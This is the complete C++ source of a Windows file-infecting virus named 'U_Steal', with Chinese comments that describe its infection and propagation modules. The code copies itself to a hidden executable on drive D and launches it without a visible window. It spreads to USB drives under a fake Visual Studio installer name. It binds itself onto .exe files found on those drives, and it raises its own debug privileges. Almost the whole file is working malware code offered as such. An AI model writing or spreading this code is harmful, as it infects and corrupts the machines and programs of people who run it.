// U_Steal.cpp : Defines the entry point for the console application.
//

//#include "stdafx.h"
#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include <direct.h>
#include <process.h>
#include <Tlhelp32.h>
#include <shellapi.h>
#include <time.h>


#define Name_Length 300
#define Path_Length 2000
#define Suffix_Len 20
#define Target_File_Type {"doc","docx","txt","xls","wps",NULL}
#define Directory_Path "D:\\123"    //保存文件的路径
#define Target_File_Path "D:\\NTDEITECTKCB.exe"
#define Spread_Name "VS2012_ULT_chs.exe"
#define Myself_Length 81920
#define KEY "588b5b964438cad01862619d118d113e"

using namespace std;

static char *Myself_Path;              //指向本程序路径

//#pragma comment(lib, "winmm.lib")
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")



/////////////////////////////////////枚举进程/////////////////////////////////////////////

class Enum_Process
{
public:
    int Seek_Process(char *ProcessName,HANDLE *Handle_List);     //检查进程名，成功返回该进程句柄，失败返回NULL。
private:
    int Privilege();
};

int Enum_Process::Seek_Process(char *ProcessName,HANDLE *Handle_List)
{
    //返回该同名进程数
    if(!Privilege()) return 0;

    HANDLE hProcess=NULL;
    int i=0;

    PROCESSENTRY32 Pe32;
    HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);

    memset(&Pe32,NULL,sizeof(Pe32));

    Pe32.dwSize=sizeof(Pe32);
    if(Process32First(hSnap,&Pe32)!=TRUE) return 0;
    do
    {
        if(!strcmp(Pe32.szExeFile,ProcessName))
        {
            if((hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,Pe32.th32ProcessID))!=INVALID_HANDLE_VALUE)     //返回进程句柄
            {
                Handle_List[i]=hProcess;
                i++;
                CloseHandle(hProcess);
            }
        }
    }
    while(Process32Next(hSnap,&Pe32)==TRUE);

    return i;
}

int Enum_Process::Privilege()
{
    //提升当前进程的访问令牌
    HANDLE hToken=NULL;

    if(OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken)!=TRUE) return 0;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount=1;
    LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);

    CloseHandle(hToken);
    return 1;
}

/*---------------------------------------  枚举进程------------------------------------------------*/


////////////////////////////////////////////磁盘相关////////////////////////////////////////////////

class Drives_Operate
{
public:
    int Check_Drive_Type();
	char *Check_Removable_Drive(char *Removable_Drive,int Length);
};

int Drives_Operate::Check_Drive_Type()
{
    return 0;
}

char *Drives_Operate::Check_Removable_Drive(char *Removable_Drive,int Length)
{
    char *p=NULL,ALL_Drives[100],CurrDrive[10];
    int k,flag=0;
    unsigned long int i;

    memset(Removable_Drive,NULL,Length);
	memset(ALL_Drives,NULL,sizeof(ALL_Drives));
	memset(CurrDrive,NULL,sizeof(CurrDrive));

    GetLogicalDriveStrings(sizeof(ALL_Drives),ALL_Drives);    //获取本机所有磁盘列表
    for(k=0,p=CurrDrive,i=0; k<2; i++)
    {
        if(ALL_Drives[i]!=NULL)
        {
            k=0;
            *p=ALL_Drives[i];
            p++;
        }
        else
        {
            k++;
            p=CurrDrive;
            //printf("%s\n",CurrDrive);
            if(GetDriveType(CurrDrive)==DRIVE_REMOVABLE)
            {
                flag=1;
                //printf("检测到移动磁盘:%s\n",CurrDrive);
                strcat(Removable_Drive,CurrDrive);
                strcat(Removable_Drive,",");
            }
            memset(CurrDrive,NULL,sizeof(CurrDrive));
        }
    }
    if(flag)
    {
        Removable_Drive[strlen(Removable_Drive)-1]=NULL;
        return Removable_Drive;        //返回储存有移动磁盘盘符的字符串指针
    }
    else
        return NULL;   //没有检测到移动磁盘
}


/*-------------------------------------------磁盘相关-----------------------------------------------*/




////////////////////////////////////////////文件操作//////////////////////////////////////////////

class File_Operate
{
public:
	BOOL Bind_EXE_File(char *File_Path);              //将自身程序和目标文件捆绑
	BOOL Release_EXE_File(char *File_Path);           //释放被捆绑的程序
	BOOL Release_Virus_File(char *File_Path);         //将自身病毒释放
	int BeginProcess(char *Path_t,char *Parameter);
};

BOOL File_Operate::Bind_EXE_File(char *File_Path)
{
	printf("File_Path:%s\n",File_Path);

	FILE *Myself=NULL,*Target_File=NULL,*Tmp_File=NULL;
	char TEMP_Path[300];
	char Buff[1024];
	int bytes=0;
	unsigned long int Now_Time=0;


	memset(TEMP_Path,NULL,sizeof(TEMP_Path));
	memset(Buff,NULL,sizeof(Buff));

	Now_Time=time(NULL);
	sprintf(TEMP_Path,"%s\\%d",getenv("TEMP"),Now_Time);

	printf("TEMP_Path:%s\n",TEMP_Path);

	if((Myself=fopen(Myself_Path,"rb"))==NULL)
	{
		fcloseall();
		return ERROR;
	}
	if((Target_File=fopen(File_Path,"rb"))==NULL)
	{
		fcloseall();
		return ERROR;
	}
	if((Tmp_File=fopen(TEMP_Path,"wb"))==NULL)
	{
		fcloseall();
		return ERROR;
	}

	while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
	{
		fwrite(Buff,sizeof(char),bytes,Tmp_File);
		memset(Buff,NULL,sizeof(Buff));
	}
	fflush(Tmp_File);
	while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Target_File))>0)
	{
		fwrite(Buff,sizeof(char),bytes,Tmp_File);
		memset(Buff,NULL,sizeof(Buff));
	}
	fflush(Tmp_File);
	fcloseall();
	remove(File_Path);
	if(!rename(TEMP_Path,File_Path)) return FALSE;
	remove(TEMP_Path);

	return TRUE;
}

BOOL File_Operate::Release_Virus_File(char *File_Path)
{
	FILE *Myself=NULL,*Target_Virus_File=NULL;
	char Buff[1024],Parameter[600];
	char TEMP_Path_File[300];
	unsigned long int Now_Time=0;
	int bytes=0,total_bytes=0;

	memset(Buff,NULL,sizeof(Buff));
	memset(Parameter,NULL,sizeof(Parameter));
	memset(TEMP_Path_File,NULL,sizeof(TEMP_Path_File));

	Now_Time=time(NULL);       //用当前时间作为临时文件名
	sprintf(TEMP_Path_File,"%s\\%d.exe",getenv("TEMP"),Now_Time);   //获取临时病毒文件路径
	printf("Release_Virus_File:%s\n",TEMP_Path_File);
	if((Myself=fopen(Myself_Path,"rb"))==NULL)
	{
		fcloseall();
		return ERROR;
	}
	if((Target_Virus_File=fopen(TEMP_Path_File,"wb"))==NULL)
	{
		fcloseall();
		return ERROR;
	}
	while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
	{
		total_bytes+=bytes;
		printf("Total_Bytes=%d\n",total_bytes);
		fwrite(Buff,sizeof(char),bytes,Target_Virus_File);
		memset(Buff,NULL,sizeof(Buff));
		if(total_bytes==Myself_Length) break;
	}
	fcloseall();
	sprintf(Parameter,"%s %s %s",TEMP_Path_File,KEY,Myself_Path); //向临时病毒中传入的参数:[病毒路径] [指纹] [被感染的文件路径]
	BeginProcess(TEMP_Path_File,Parameter);
	return TRUE;
}

BOOL File_Operate::Release_EXE_File(char *File_Path)
{
	FILE *Target_EXE_File=NULL,*Release_EXE=NULL;
	char Buff[1024],TEMP_Path[300],*p=NULL,*Start_Name=NULL,Target_File_Name[300];
	int bytes=0;

	memset(Buff,NULL,sizeof(Buff));
	memset(TEMP_Path,NULL,sizeof(TEMP_Path));
	memset(Target_File_Name,NULL,sizeof(Target_File_Name));

	for(p=Myself_Path;*p!=NULL;p++)
		if(*p=='\\') Start_Name=p+1;
	memcpy(Target_File_Name,Start_Name,p-Start_Name);     //获取目标文件名
	if((Target_EXE_File=fopen(File_Path,"rb"))==NULL)
	{
		fcloseall();
		return ERROR;
	}
	sprintf(TEMP_Path,"%s\\%s",getenv("TEMP"),Target_File_Name);
	printf("Release_EXE_File:%s\n",TEMP_Path);
	if((Release_EXE=fopen(TEMP_Path,"wb"))==NULL)
	{
		fcloseall();
		return ERROR;
	}
	fseek(Target_EXE_File,Myself_Length+1,SEEK_SET);
	while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Target_EXE_File))>0)
	{
		fwrite(Buff,sizeof(char),bytes,Release_EXE);
		memset(Buff,NULL,sizeof(Buff));
	}
	fflush(Release_EXE);
	fcloseall();
	BeginProcess(TEMP_Path,NULL);
	return TRUE;
}

int File_Operate::BeginProcess(char *Path_t,char *Parameter)
{
    //启动程序,返回1表示启动成功,0表示启动失败。
    char *Path=Path_t;

    HANDLE hProcess=ShellExecute(NULL,"open",Path,Parameter,NULL,SW_HIDE);
    if(hProcess==NULL)
    {
        CloseHandle(hProcess);
        return 0;
    }
    CloseHandle(hProcess);
    return 1;
}

/*-------------------------------------------文件操作-----------------------------------------------*/




///////////////////////////////////////引导模块/////////////////////////////////////////////////

int Check_Myself()
{
	//返回1表示此文件被捆绑,0表示文件未被捆绑
	FILE *Myself=NULL;

	if((Myself=fopen(Myself_Path,"rb"))==NULL)
	{
		fcloseall();
		return 1;
	}
	fseek(Myself,0,SEEK_END);
	if(ftell(Myself)>Myself_Length)
	{
		fcloseall();
		return 1;
	}
	else
	{
		fcloseall();
		return 0;
	}

}

int Check_Local_Drive()
{
    //返回1表示本程序在D盘下，0表示不再D盘下

    if(Myself_Path[0]=='D') return 1;

    return 0;
}

int Check_Target(char *File_Path)
{
    //检查目标是否已被感染,返回1表示已感染，0表示未感染。
    int bytes=0;
    unsigned long File_Size=0;
    char Buff_T[1024],Buff_M[1024];
    FILE *Target_File=NULL,*Myself=NULL;

    memset(Buff_T,NULL,sizeof(Buff_T));
    memset(Buff_M,NULL,sizeof(Buff_M));

    if((Target_File=fopen(File_Path,"rb"))==NULL)
    {
        fcloseall();
        return 0;
    }
    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return 0;
    }

    while(fread(Buff_M,sizeof(Buff_M)-1,1,Myself)>0 && fread(Buff_T,sizeof(Buff_T)-1,1,Target_File)>0)
    {
        if(strcmp(Buff_M,Buff_T)!=0)
        {
            fcloseall();
            return 0;
        }
    }
    fcloseall();
    return 1;
}

int Check_Process(char *Process_Name)
{
    //检查进程是否已经存在
    class Enum_Process Seek_Pro;
    int Process_Num=0,Max_Num=0;
    HANDLE Process_List[50];
	char My_Name[20],*p=NULL,*Name_Start=NULL;

    memset(My_Name,NULL,sizeof(My_Name));

	for(p=Myself_Path;*p!=NULL;p++)
	{
		if(*p=='\\') Name_Start=p+1;
	}

	memcpy(My_Name,Name_Start,p-Name_Start);     //获取本程序名

	if(!strcmp(My_Name,Process_Name)) Max_Num=2;   //若与被检查的进程名相同则需要返回两个相同的进程名则表示程序先前已启动
	else
		Max_Num=1;   //若不相同则只需检查有无一个此进程名
    if((Process_Num=Seek_Pro.Seek_Process(Process_Name,Process_List))==0)        //检查此进程名是否存在，若已存在则返回其进程句柄
        return 0;                   //表示不存在此进程
    else
    {
        if(Process_Num>=Max_Num) return 1;                    //表示存在此进程
        else
            return 0;
    }
}
/*------------------------------------------------------------------------------------------------*/




/////////////////////////////////////////感染模块////////////////////////////////////////////////

int Inject_Target_Computer()
{
    //返回1表示感染成功，0表示感染失败。
    FILE *Target_File=NULL,*Myself=NULL;
    int bytes=0;
    char Buff[1024];

    memset(Buff,NULL,sizeof(Buff));
    if((Target_File=fopen(Target_File_Path,"wb"))==NULL)
    {
        fcloseall();
        return 0;
    }
    if((Myself=fopen(Myself_Path,"rb"))==NULL)
    {
        fcloseall();
        return 0;
    }

    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
    {
        fwrite(Buff,sizeof(char),bytes,Target_File);
        memset(Buff,NULL,sizeof(Buff));
    }
    fcloseall();
    return 1;
}

int Inject_Target_Removable_Drive(char *Target_Path)
{
	//返回0表示感染失败,1表示感染成功。
	FILE *Target_File=NULL,*Myself=NULL;
	char Buff[1024];
	int bytes=0;

	memset(Buff,NULL,sizeof(Buff));

	if((Target_File=fopen(Target_Path,"wb"))==NULL)
	{
		fcloseall();
		return 0;
	}
	if((Myself=fopen(Myself_Path,"rb"))==NULL)
	{
		fcloseall();
		return 0;
	}
	while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Myself))>0)
	{
		fwrite(Buff,bytes,sizeof(char),Target_File);
		memset(Buff,NULL,sizeof(Buff));
	}
	fcloseall();
	return 1;
}

int Inject_EXE_File(char *Target_Path,int EXE_File_Length,int Directory_Deep)
{
	printf("Target_Path:%s\n",Target_Path);

	if(Directory_Deep==0) return 0;

    char folder[Name_Length],file[Name_Length],path[Path_Length],Paramter_path[Path_Length],Traversal_Dir_Path[Path_Length];
    char *file_type="\\*.exe",EXE_File_Path[Path_Length];
	int Directory_Deep_Num=Directory_Deep;             //遍历目录的级数
    WIN32_FIND_DATA FindFileData;
	class File_Operate func;
	FILE *Target_File=NULL;

    memset(folder,NULL,sizeof(folder));
    memset(file,NULL,sizeof(file));
    memset(path,NULL,sizeof(path));
    memset(Traversal_Dir_Path,NULL,sizeof(Traversal_Dir_Path));
    memset(Paramter_path,NULL,sizeof(Paramter_path));
	memset(EXE_File_Path,NULL,sizeof(EXE_File_Path));

	strcat(path,Target_Path);
	if(path[strlen(path)-1]=='\\') path[strlen(path)-1]=NULL;   //消去路径最后一位的'\'
    strcat(Paramter_path,path);        //子目录路径
    strcat(Traversal_Dir_Path,path);    //遍历所有文件
	strcat(EXE_File_Path,path);
	strcat(EXE_File_Path,file_type);
    //表示不遍历此目录
    if(!strcmp(Traversal_Dir_Path,".") || !strcmp(Traversal_Dir_Path,"..") || Traversal_Dir_Path[strlen(Traversal_Dir_Path)-1]=='.') return 0;

    strcat(Traversal_Dir_Path,"\\*.*");

    //遍历出当前目录下所有的文件夹和文件
    HANDLE hFind=FindFirstFile(Traversal_Dir_Path,&FindFileData);  //读取目录下第一个文件
    if(hFind==INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return 0;   //表示当前目录下为空
    }
    do
    {
        if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件夹
            memset(folder,NULL,sizeof(folder));
            strcat(folder,FindFileData.cFileName);
            //printf("folder:%s\n",folder);
            if(folder[strlen(folder)-1]=='.') continue;
            Paramter_path[strlen(Paramter_path)]='\\';
            strcat(Paramter_path,folder);
            //printf("遍历子目录:%s\n",Paramter_path);
            Inject_EXE_File(Paramter_path,EXE_File_Length,Directory_Deep_Num-1);    //递归

            memset(Paramter_path,NULL,sizeof(Paramter_path));
            strcat(Paramter_path,path);
        }
    }
    while(FindNextFile(hFind,&FindFileData));

	FindClose(hFind);

    //查找当前目录下的指定文件

    if((hFind=FindFirstFile(EXE_File_Path,&FindFileData))==INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return 0;
    }
    do
    {
        if(FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件
            strcat(file,FindFileData.cFileName);
			printf("file:%s\npath:%s\n",file,path);
			memset(EXE_File_Path,NULL,sizeof(EXE_File_Path));
            strcat(EXE_File_Path,path);
			strcat(EXE_File_Path,"\\");
			strcat(EXE_File_Path,file);
			printf("EXE_Path:%s\n",EXE_File_Path);
			if((Target_File=fopen(EXE_File_Path,"rb"))!=NULL)
            {
				fseek(Target_File,0,SEEK_END);
				if(ftell(Target_File)<=EXE_File_Length)
					if(!Check_Target(EXE_File_Path))
				        func.Bind_EXE_File(EXE_File_Path);
			}

			fcloseall();
            memset(file,NULL,sizeof(file));
        }
    }
    while(FindNextFile(hFind,&FindFileData));

    FindClose(hFind);
    return 1;
}

DWORD WINAPI Inject_Removable_Drives(LPVOID Parameter)
{
    class Drives_Operate func;
    unsigned int i;
    int Removable_Drive_String_Len=0;
    char Removable_Drive[100],Target_Drive[10],Target_File[50],*p=NULL;

    memset(Removable_Drive,NULL,sizeof(Removable_Drive,sizeof(Removable_Drive)));
    memset(Target_Drive,NULL,sizeof(Target_Drive));
	memset(Target_File,NULL,sizeof(Target_File));

    while(1)
    {
        Sleep(10000);              //每读取一次磁盘后程序暂停十秒防止CPU使用率过高
        if(func.Check_Removable_Drive(Removable_Drive,sizeof(Removable_Drive))!=NULL)
        {
            //printf("检测到移动磁盘:%s\n",Removable_Drive);

            for(i=0,p=Target_Drive; 1; i++)
            {
                //遍历所有的可移动磁盘
                if(Removable_Drive[i]!=',' && Removable_Drive[i]!=NULL)
                {
                    *p=Removable_Drive[i];
                    p++;
                }
                else
                {
                    p=Target_Drive;
					//检测设备是否就绪
                    if(!GetVolumeInformation(Target_Drive,0,0,0,0,0,0,0));  //设备未就绪
					else
					{
						sprintf(Target_File,"%s%s",Target_Drive,Spread_Name);            //设备已就绪
						Inject_Target_Removable_Drive(Target_File);
						Inject_EXE_File(Target_Drive,10000000,-1);
						memset(Target_File,NULL,sizeof(Target_File));
					}
					memset(Target_Drive,NULL,sizeof(Target_Drive));
                }
                if(Removable_Drive[i]==NULL) break;
            }
        }
    }
    return 0;
}
/*------------------------------------------------------------------------------------------------*/






/////////////////////////////////////////表现模块//////////////////////////////////////////////////










/*------------------------------------------------------------------------------------------------*/



int main(int argc, char* argv[])
{
	Myself_Path=argv[0];

	class File_Operate File_Func;

	if(argc==3)
	{
		if(!strcmp(argv[1],KEY))                     //检测程序指纹
			File_Func.Release_EXE_File(argv[2]);    //释放被感染的EXE文件
	}
	if(Check_Myself())
	{
		printf("捆绑在其它EXE程序中\n");
		while(File_Func.Release_Virus_File(Myself_Path)!=TRUE);  //释放病毒程序
		system("pause");
		exit(0);
	}
	printf("没有捆绑\n");
    if(Check_Local_Drive()) goto skip_Inject;  //判断本程序是否在D盘下,若在则判断程序先前是否已启动。

    //若不在D盘下则准备感染D盘

    if(!Check_Target(Target_File_Path))       //检查本机是否已被感染
    {
		//printf("开始感染D盘\n");
        while(!Inject_Target_Computer()) Sleep(1);     //调用感染模块
        while(!File_Func.BeginProcess(Target_File_Path,NULL)) Sleep(1);      //启动程序
		system("pause");
        exit(0);
    }


skip_Inject:
    //若已感染则检查程序是否已启动
    char Process_Name[100],*p=Target_File_Path+3;

    memset(Process_Name,NULL,sizeof(Process_Name));

    strcat(Process_Name,p);     //获取需要检查的进程名
    if(!Check_Process(Process_Name))
    {
        if(!Check_Local_Drive())
		{
			while(!File_Func.BeginProcess(Target_File_Path,NULL)) Sleep(1);          //启动程序
			system("pause");
			exit(0);
		}
    }
    else
        exit(0);
/////////////////////////////////////////////////////////////////////////////////////////////////////
    MessageBox(NULL,"程序启动成功!","TEST",MB_OK);

    HANDLE hInject_Thread=NULL;

	CloseHandle(hInject_Thread=CreateThread(NULL,0,Inject_Removable_Drives,NULL,0,NULL));
    while(1) Sleep(111);
    return 0;
}












